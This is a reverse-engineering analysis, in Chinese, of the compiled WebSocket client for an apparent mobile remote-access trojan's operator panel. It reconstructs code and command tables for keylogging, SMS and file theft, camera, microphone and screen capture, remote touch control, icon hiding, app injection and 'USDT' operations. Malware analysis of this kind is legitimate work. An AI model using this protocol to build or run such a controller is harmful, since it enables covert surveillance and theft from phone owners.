# 前端 WebSocket 客户端分析文档

> 本文档分析编译后的前端文件 `info-DVhp2HZJ.js` 中的 WebSocket 客户端实现。
> 
> **注意**: 此文件为 Vite 构建后的压缩代码，变量名已被混淆，本文档通过逆向分析还原其逻辑。

## 概述

这是管理面板的设备详情页面（`info` 组件），通过 WebSocket 与服务器建立实时连接，实现对单个设备的远程控制和数据获取。

### 源文件信息

| 属性 | 值 |
|------|-----|
| 文件名 | `info-DVhp2HZJ.js` |
| 组件名 | `info` (Vue 3 组件) |
| 构建工具 | Vite |
| 框架 | Vue 3 + Naive UI |
| 依赖 | Lodash (throttle) |

---

## WebSocket 连接管理

### 连接初始化

```javascript
// 原始代码位置: 行 5444-5575
const ur = () => {
  // 从全局配置获取 WebSocket 地址
  c = new WebSocket(window.__PRODUCTION__ADMINPRO__CONF__.VITE_GLOB_WS_HOST);
  
  c.onopen = () => {
    window.$message.success("网页端连接成功");
    // 发送 join 消息订阅设备
    const a = {
      itype: "slr_panel",
      subc: "join",
      pid: E.value,  // 设备 ID (从 URL 参数获取)
      usercheck: zl.get("CURRENT-USER")  // 当前用户
    };
    c.send(JSON.stringify(a));
  };
  
  c.onerror = (a) => {
    window.$message.error("连接失败");
  };
  
  c.onclose = () => {
    window.$message.error("连接关闭");
  };
};
```

### 设备 ID 获取

```javascript
// 从 URL 查询参数获取设备 ID
// 例如: /info?id=abc123
const ir = new URLSearchParams(window.location.search);
E.value = ir.get("id");
```

### 心跳机制

```javascript
// 每 5 秒发送一次 ping
de = setInterval(() => {
  Gt();  // 发送 ping
  Mv(1, 10, {});  // 刷新设备列表
}, 5000);

function Gt() {
  if (c && c.readyState === WebSocket.OPEN) {
    const a = { itype: "slr_panel", subc: "ping", pid: E.value };
    c.send(JSON.stringify(a));
  }
}
```

### 页面卸载处理

```javascript
// 页面关闭前发送 out 命令
function gn(a) {
  if (c && c.readyState === WebSocket.OPEN) {
    const u = { itype: "slr_panel", subc: "out", pid: E.value };
    // 仅管理员发送
    if (o == "admin") c.send(JSON.stringify(u));
  }
  a.returnValue = "";
}
```

---

## 消息接收处理

### 消息类型映射表

| type | 处理函数 | 功能说明 |
|------|----------|----------|
| `mic` | `vu()` | 麦克风音频数据 (Base64 WAV) |
| `loadcontacts` | `yu()` | 联系人列表 |
| `loadapps` | `mu()` | 应用列表 (含图标) |
| `snap` | `Addsnapshort()` | 截图数据 |
| `screen` | `Ee()` | 实时屏幕图像 |
| `screenshot` | `Oi()` | 屏幕截图 |
| `files` | `Jr()` | 文件列表 |
| `savefiles` | (内联) | 文件下载 |
| `sms` | `bu()` | 短信列表 |
| `thumb` | `wu()` + `ar()` | 缩略图 |
| `loc` | `updateClientLocation()` | 位置信息 |
| `cam` | `xu()` | 摄像头图像 |
| `statusBatch` | `lr()` | 设备状态批量更新 |
| `injapps` | (内联) | 注入应用列表 |
| `klog` | `$r()` | 实时键盘记录 |
| `klogsdate` | `_u()` | 按日期键盘记录 |
| `proxy` | `handleProxyMessage()` | 代理状态 |

### 消息处理示例

#### 屏幕图像处理
```javascript
case "screen":
  // 将 Base64 转为图片显示
  Ee(p, `data:image/jpeg;base64,${u.data}`, u.wmob, u.hmob);
  break;
```

#### 文件下载处理
```javascript
case "savefiles":
  const k = JSON.parse(u.data);
  const L = k.fileName;
  const R = k.fileContent;
  // Base64 转 Uint8Array
  const z = new Uint8Array(
    atob(R).split("").map(($n) => $n.charCodeAt(0))
  );
  // 创建 Blob 并下载
  const nn = new Blob([z], { type: "application/octet-stream" });
  const on = document.createElement("a");
  on.href = URL.createObjectURL(nn);
  on.download = L;
  on.click();
  break;
```

#### 设备状态处理
```javascript
function lr(a) {
  const u = {
    0: "连接中", 1: "已连接", 2: "正在关闭", 3: "已关闭",
    CONNECTING: "连接中", OPEN: "已连接", CLOSING: "正在关闭", CLOSED: "已关闭"
  };
  Ot.value = a.lastPing;           // 最后 ping 时间
  Ct.value = u[a.serverToPhone];   // 连接状态
  vn.value = a.phoneInfo;          // 设备信息
  kn.value = vn.value.keylogs.split("*").map(p => ({ label: p, value: p }));
}
```

---

## 命令发送函数

### 连接管理命令

| 函数 | subc | 功能 |
|------|------|------|
| `Gt()` | `ping` | 心跳检测 |
| `Kt()` | `disag` | 断开连接并刷新页面 |
| `gn()` | `out` | 页面关闭时退出 |

### 导航控制 (itype: slr_panel)

| 函数 | comand | navshort | 功能 |
|------|--------|----------|------|
| `zr()` | `nav` | `rec` | 最近任务键 |
| `kt()` | `nav` | `ho` | Home 键 |
| `Gr()` | `nav` | `bak` | 返回键 |

### 锁屏控制 (itype: slr_panel)

| 函数 | comand | lockit | 功能 |
|------|--------|--------|------|
| `Kr()` | `L` | `0` | 解锁 |
| `qr()` | `L` | `1` | 锁定 |
| `Yr()` | `L` | `2` | 锁定模式 2 |
| `Zr()` | `L` | `3` | 锁定模式 3 |

### 屏幕阻止 (itype: slr_panel)

| 函数 | comand | bstate | 功能 |
|------|--------|--------|------|
| `or()` | `block` + `blockd` | `0` | 显示阻止文本 |
| `Xr()` | `block` | `1` | 阻止模式 1 |
| `Qr()` | `block` | `2` | 阻止模式 2 |
| `Vr()` | `block` | `3` | 阻止模式 3 |

### 音量控制 (itype: slr_panel)

| 函数 | comand | volstate | 功能 |
|------|--------|----------|------|
| `jr()` | `vol` | `0` | 音量减 |
| `ni()` | `vol` | `1` | 音量加 |

### 键盘控制 (itype: slr_panel)

| 函数 | comand | kbstate | 功能 |
|------|--------|---------|------|
| `ei()` | `kb` | `2` | 键盘模式 2 |
| `at()` | `kb` | `3` | 键盘模式 3 |

### USDT 相关 (itype: slr_panel)

| 函数 | usdttype | 功能 |
|------|----------|------|
| `Ou()` | `2` | USDT 操作 2 |
| `Et()` | `0` | USDT 操作 0 |
| `Cu()` | `6` | USDT 操作 6 |
| `ku()` | `7` | USDT 操作 7 |
| ... | `8-19` | 其他 USDT 操作 |

### 数据操作命令 (itype: slr_panelsend)

| 函数 | subc | 功能 |
|------|------|------|
| `fi()` | `Hideico` | 隐藏图标 |
| `cr()` | `Keylog` | 键盘记录开关 |
| `dr()` | `Logdate` | 按日期获取键盘记录 |
| `Nt()` | `SMS` | 获取短信 |
| `Ye()` | `SMSSEND` | 发送短信 |
| `pi()` | `rename` | 重命名设备 |
| `Tu()` | `Contacts` | 获取联系人 |
| `vr()` | `cam` / `camoff` | 摄像头开关 |
| `hr()` | `mic` / `micoff` | 麦克风开关 |
| `ot()` | `LOADAPPS` | 获取应用列表 |
| `Rt()` | `files` | 获取文件列表 |
| `Mu()` | `files` | 刷新当前目录 |
| `Du()` | `viewfile` | 查看文件 |
| `_i()` | `changefiles` | 文件操作 (删除/下载) |
| `X()` | `changefiles` | 上传文件 |
| `Q()` | `noinj` | 取消注入 |
| `$u()` | `OPENINJ` | 打开注入 |
| `Ju()` | `OPENAPP` | 打开应用 |
| `Hu()` | `UNINSTALLAPP` | 卸载应用 |
| `ai()` | `DIAO` | 显示对话框 |
| `Si()` | `screen` | 屏幕共享开关 |
| `xi()` | `screen` | 屏幕模式切换 |

### 广播通知 (itype: slr_panel)

```javascript
function wi() {
  if (c && c.readyState === WebSocket.OPEN) {
    let a = "nothing";
    if (Zn.value && Zn.value.trim() !== "") a = "openApp";
    const u = {
      itype: "slr_panel",
      subc: "bc",
      pid: E.value,
      comand: "alert",
      title: xe.value,
      msg: nr.value,
      todo: Zn.value,      // 要打开的应用包名
      act: a,              // nothing / openApp
      alertico: wn.value   // 图标
    };
    c.send(JSON.stringify(u));
  }
}
```

### 粘贴文本 (itype: slr_panel)

```javascript
function At() {
  if (c && c.readyState === WebSocket.OPEN) {
    const a = {
      itype: "slr_panel",
      subc: "screen",
      comand: "paste",
      pid: E.value,
      txt: Yn.value
    };
    c.send(JSON.stringify(a));
  }
}
```

---

## 触摸事件处理

### 触摸类型

| movetype | 含义 |
|----------|------|
| `0` | 单击 (tap) |
| `1` | 滑动 (swipe) |
| `2` | 长按 (long press) |

### 触摸事件流程

```javascript
// 鼠标按下
function br(a, u) {
  a.preventDefault();
  if (a.button !== 0 || !u.value) return;
  
  er.value = true;   // 正在触摸
  Oe.value = true;   // 可能是单击
  tr.value = false;  // 不是长按
  ke = [];           // 清空轨迹
  
  const p = u.value.getBoundingClientRect();
  se = a.clientX - p.left;  // 起始 X
  qe = a.clientY - p.top;   // 起始 Y
  ke.push({ x: se, y: qe });
  
  // 350ms 后判定为长按
  Ce = setTimeout(() => {
    tr.value = true;
  }, 350);
}

// 鼠标移动 (节流 50ms)
let Ni = Yv.throttle((a, u) => {
  _n(a, u);
}, 50);

function xn(a, u) {
  if (!er.value || !u.value) return;
  
  const p = u.value.getBoundingClientRect();
  const k = a.clientX - p.left;
  const L = a.clientY - p.top;
  
  // 移动超过阈值，取消单击判定
  if (Math.abs(k - se) > qa || Math.abs(L - qe) > qa) {
    Oe.value = false;
    clearTimeout(Ce);
  }
  
  ke.push({ x: k, y: L });
  // 实时发送滑动轨迹
  Ni("1", ke.map(R => `(${R.x},${R.y})`).join(":"));
}

// 鼠标抬起
function Ri(a, u) {
  a.preventDefault();
  er.value = false;
  clearTimeout(Ce);
  
  if (!u.value) return;
  
  const p = u.value.getBoundingClientRect();
  const k = Ke.value / p.width;   // X 缩放比
  const L = st.value / p.height;  // Y 缩放比
  const R = { x: Math.round(se * k), y: Math.round(qe * L) };
  
  if (tr.value) {
    _n("2", R);  // 长按
  } else if (Oe.value) {
    _n("0", R);  // 单击
  } else {
    // 滑动 - 发送完整轨迹
    const nn = ke
      .map(on => ({ x: Math.round(on.x * k), y: Math.round(on.y * L) }))
      .map(on => `(${on.x},${on.y})`)
      .join(":");
    _n("1", nn);
  }
}

// 发送触摸命令
function _n(a, u) {
  if (!E.value || !c || c.readyState !== WebSocket.OPEN) return;
  
  c.send(JSON.stringify({
    itype: "slr_panel",
    subc: "screen",
    comand: "mov",
    pid: E.value,
    movetype: a,
    poi: u,
    usercheck: zl.get("CURRENT-USER")
  }));
}
```

---

## 状态变量映射

### 主要响应式变量

| 混淆名 | 推测原名 | 类型 | 用途 |
|--------|----------|------|------|
| `E` | `phoneId` | Ref\<string\> | 设备 ID |
| `vn` | `phoneInfo` | Ref\<object\> | 设备信息 |
| `c` | `ws` / `socket` | WebSocket | WebSocket 连接 |
| `Ot` | `lastPing` | Ref\<string\> | 最后 ping 时间 |
| `Ct` | `connectionStatus` | Ref\<string\> | 连接状态 |
| `ve` | `screenImage` | Ref\<string\> | 屏幕图像 |
| `ie` | `screenshotImage` | Ref\<string\> | 截图图像 |
| `Fr` | `cameraImage` | Ref\<string\> | 摄像头图像 |
| `Ke` | `screenWidth` | Ref\<number\> | 屏幕宽度 |
| `st` | `screenHeight` | Ref\<number\> | 屏幕高度 |
| `bn` | `smsList` | Ref\<array\> | 短信列表 |
| `Be` | `contactsList` | Ref\<array\> | 联系人列表 |
| `wt` | `appsList` | Ref\<array\> | 应用列表 |
| `qt` | `filesList` | Ref\<array\> | 文件列表 |
| `Dn` | `keylogData` | Ref\<array\> | 键盘记录 |
| `pe` | `realtimeKeylog` | Ref\<array\> | 实时键盘记录 |
| `ge` | `injectedApps` | Ref\<array\> | 注入应用列表 |
| `ue` | `isScreenOn` | Ref\<boolean\> | 屏幕共享状态 |
| `$e` | `isCameraOn` | Ref\<boolean\> | 摄像头状态 |
| `Je` | `isMicOn` | Ref\<boolean\> | 麦克风状态 |
| `Fn` | `isKeylogOn` | Ref\<boolean\> | 键盘记录状态 |
| `Sn` | `currentPath` | Ref\<string\> | 当前文件路径 |

---

## 数据解析函数

### 联系人解析
```javascript
function yu(a) {
  a.split("\n").forEach(p => {
    const k = p.replace(/\n/g, "").replace(/\r/g, "").trim();
    if (k) {
      const L = JSON.parse(k);
      Be.value.push({ name: L.name, number: L.number });
    }
  });
}
```

### 短信解析
```javascript
function bu(a, u) {
  bn.value = [];
  a.split("\n").forEach(k => {
    const L = k.replace(/\n/g, "").replace(/\r/g, "").trim();
    if (L) {
      const R = JSON.parse(L);
      bn.value.push({
        time: R.time,
        message: R.message,
        full_message: R.full_message,
        number: R.address
      });
    }
  });
}
```

### 文件列表解析
```javascript
function Jr(a) {
  const u = "[>A<]";  // 字段分隔符
  const k = a.split("[>D<]").map(L => {  // 记录分隔符
    const R = L.split(u);
    return {
      name: R[2] || "未知文件名",
      size: R[3] || "未知大小",
      path: R[4] || "未知路径",
      lastModified: R[5] || "未知日期",
      imageSrc: ""
    };
  });
  // 更新当前路径
  if (k.length > 0) Sn.value = k[0].path;
  // 加载图片缩略图
  k.forEach(L => {
    if (vi(L)) {  // 是图片文件
      Du(L);
      const R = L.path + "/" + L.name;
      Wu(R).then(z => {
        if (z) L.imageSrc = `data:image/jpeg;base64,${z}`;
      });
    }
  });
  setTimeout(() => { qt.value = k; }, 1000);
}
```

### 应用列表解析
```javascript
function mu(a) {
  const p = JSON.parse(a).apps;
  if (!Array.isArray(p)) throw new Error("apps 不是有效的数组");
  p.forEach(k => {
    // 补全图标前缀
    if (k.icon && !k.icon.startsWith("data:image/png;base64,")) {
      k.icon = `data:image/png;base64,${k.icon}`;
    }
  });
  wt.value = p;
}
```

### 键盘记录解析
```javascript
function _u(a, u) {
  En.value = true;
  if (a?.data) {
    let p;
    try {
      p = decodeURIComponent(a.data);
    } catch (L) {
      // 清理无效的 URL 编码
      let R = a.data.replace(/%[^0-9A-Fa-f]/g, "");
      R = R.replace(/%20/g, " ");
      try {
        p = decodeURIComponent(R);
      } catch (z) {
        p = a.data;
      }
    }
    // 解析格式: app|action|status|time>app|action|status|time>...
    const k = p.split(">");
    Dn.value = k.map(L => {
      const R = L.split("|");
      return {
        time: R[3] || "未知时间",
        app: R[0] || "未知界面",
        action: R[1] || "未知操作",
        status: R[2] || "未知内容"
      };
    });
  }
}
```

---

## IndexedDB 缓存

用于缓存图片缩略图，避免重复请求：

```javascript
// 打开数据库
function Hr() {
  return new Promise((a, u) => {
    const p = indexedDB.open("ImageDatabase", 1);
    p.onupgradeneeded = function(k) {
      k.target.result
        .createObjectStore("images", { keyPath: "path" })
        .createIndex("path", "path", { unique: true });
    };
    p.onsuccess = function(k) { a(k.target.result); };
    p.onerror = function(k) { u("Database error: " + k.target.errorCode); };
  });
}

// 保存图片
function wu(a, u) {
  Hr().then(p => {
    p.transaction("images", "readwrite")
      .objectStore("images")
      .put({ path: a, data: u });
  });
}

// 读取图片
function Su(a) {
  return new Promise((u, p) => {
    Hr().then(k => {
      const z = k.transaction("images", "readonly")
        .objectStore("images")
        .get(a);
      z.onsuccess = function() {
        const nn = z.result;
        u(nn ? nn.data : null);
      };
    });
  });
}
```

---

## 权限控制

```javascript
// 组件挂载时检查权限
bv(() => {
  o = zl.get("CURRENT-AUTHORTY");
  // 非管理员禁用交互
  if (o != "admin") {
    document.body.style.pointerEvents = "none";
    document.body.style.overflow = "auto";
  }
  // ...
});
```

---

## 前端数据存储

### 存储架构概述

前端接收到 WebSocket 数据后，**不会持久化到服务器**，而是存储在以下位置：

### 1. Vue 响应式状态 (内存)

| 数据类型 | 变量 | 生命周期 | 说明 |
|----------|------|----------|------|
| 短信列表 | `bn` (smsList) | 页面会话 | 刷新页面后丢失 |
| 联系人列表 | `Be` (contactsList) | 页面会话 | 刷新页面后丢失 |
| 应用列表 | `wt` (appsList) | 页面会话 | 刷新页面后丢失 |
| 文件列表 | `qt` (filesList) | 页面会话 | 刷新页面后丢失 |
| 键盘记录 | `Dn` (keylogData) | 页面会话 | 刷新页面后丢失 |
| 实时键盘 | `pe` (realtimeKeylog) | 页面会话 | 刷新页面后丢失 |
| 屏幕图像 | `ve` (screenImage) | 实时更新 | 仅保留最新帧 |
| 摄像头图像 | `Fr` (cameraImage) | 实时更新 | 仅保留最新帧 |
| 设备信息 | `vn` (phoneInfo) | 页面会话 | 来自 statusBatch |

### 2. IndexedDB (浏览器持久化)

| 数据库名 | 存储对象 | 键 | 值 | 用途 |
|----------|----------|-----|-----|------|
| `ImageDatabase` | `images` | `path` (文件路径) | Base64 图片数据 | 缓存文件缩略图 |

```javascript
// IndexedDB 结构
{
  path: "/sdcard/DCIM/photo.jpg",  // 文件路径作为键
  data: "data:image/jpeg;base64,..." // Base64 图片数据
}
```

### 3. 本地文件下载

| 数据类型 | 触发方式 | 保存位置 |
|----------|----------|----------|
| 文件内容 | `savefiles` 消息 | 浏览器下载目录 |
| 键盘记录导出 | 用户点击导出 | 浏览器下载目录 |
| 短信导出 | 用户点击导出 | 浏览器下载目录 |

### 数据流向图

```
┌─────────────────────────────────────────────────────────────────┐
│                    WebSocket Server                              │
│                    (实时转发，不存储)                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ type: "sms/files/screen/..."
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    前端 Vue 组件 (info)                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                 c.onmessage 消息处理                        │  │
│  │  switch(u.type) {                                         │  │
│  │    case "sms":    → bn.value = 解析后的短信列表            │  │
│  │    case "screen": → ve.value = Base64 图片                │  │
│  │    case "files":  → qt.value = 解析后的文件列表            │  │
│  │    ...                                                    │  │
│  │  }                                                        │  │
│  └───────────────────────────────────────────────────────────┘  │
│                              │                                   │
│              ┌───────────────┼───────────────┐                   │
│              ▼               ▼               ▼                   │
│  ┌─────────────────┐ ┌─────────────┐ ┌─────────────────┐        │
│  │  Vue 响应式状态  │ │  IndexedDB  │ │   文件下载       │        │
│  │  (内存，临时)    │ │ (持久缓存)  │ │  (用户触发)      │        │
│  │                 │ │             │ │                 │        │
│  │ - 短信列表      │ │ - 缩略图    │ │ - 文件内容      │        │
│  │ - 联系人        │ │             │ │ - 导出数据      │        │
│  │ - 应用列表      │ │             │ │                 │        │
│  │ - 屏幕图像      │ │             │ │                 │        │
│  └─────────────────┘ └─────────────┘ └─────────────────┘        │
└─────────────────────────────────────────────────────────────────┘
```

### 重要结论

1. **无服务端持久化**：所有敏感数据（短信、联系人、键盘记录等）仅存在于前端内存
2. **刷新即丢失**：页面刷新后，除 IndexedDB 缓存的缩略图外，所有数据需重新获取
3. **实时性**：屏幕、摄像头等媒体数据仅保留最新帧，不做历史记录
4. **用户主动导出**：如需保存数据，用户需手动点击导出按钮下载到本地

---

## 配置依赖

| 配置项 | 来源 | 说明 |
|--------|------|------|
| `VITE_GLOB_WS_HOST` | `window.__PRODUCTION__ADMINPRO__CONF__` | WebSocket 服务器地址 |
| `CURRENT-USER` | Cookie (`zl`) | 当前登录用户 |
| `CURRENT-AUTHORTY` | Cookie (`zl`) | 用户权限 (admin/user) |

---

## 相关文档

- [WEBSOCKET_SERVER.md](./WEBSOCKET_SERVER.md) - 服务端 WebSocket 实现
- [SYSTEM_FEATURES.md](./SYSTEM_FEATURES.md) - 系统功能概述
- [APK_RUNTIME_FLOW.md](./APK_RUNTIME_FLOW.md) - 客户端运行流程
